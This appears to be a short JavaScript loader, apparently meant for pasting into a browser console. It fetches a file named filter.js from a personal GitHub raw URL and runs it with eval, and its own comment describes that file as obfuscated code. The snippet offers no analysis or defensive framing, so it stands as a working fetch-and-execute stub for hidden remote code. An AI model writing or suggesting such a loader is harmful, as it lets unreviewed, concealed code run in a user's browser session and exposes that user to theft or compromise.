(function() {
    // 1. Replace this URL with the 'Raw' URL from GitHub
    const scriptUrl = 'https://raw.githubusercontent.com/ajehrg26/s/main/filter.js';

    fetch(scriptUrl)
        .then(response => {
            if (!response.ok) throw new Error('Could not fetch filter.js - Ensure you are logged into GitHub.');
            return response.text();
        })
        .then(data => {
            console.log('Successfully fetched filter.js. Executing...');
            // Executing the obfuscated code
            eval(data); 
        })
        .catch(err => console.error('Loader Error:', err));
})();
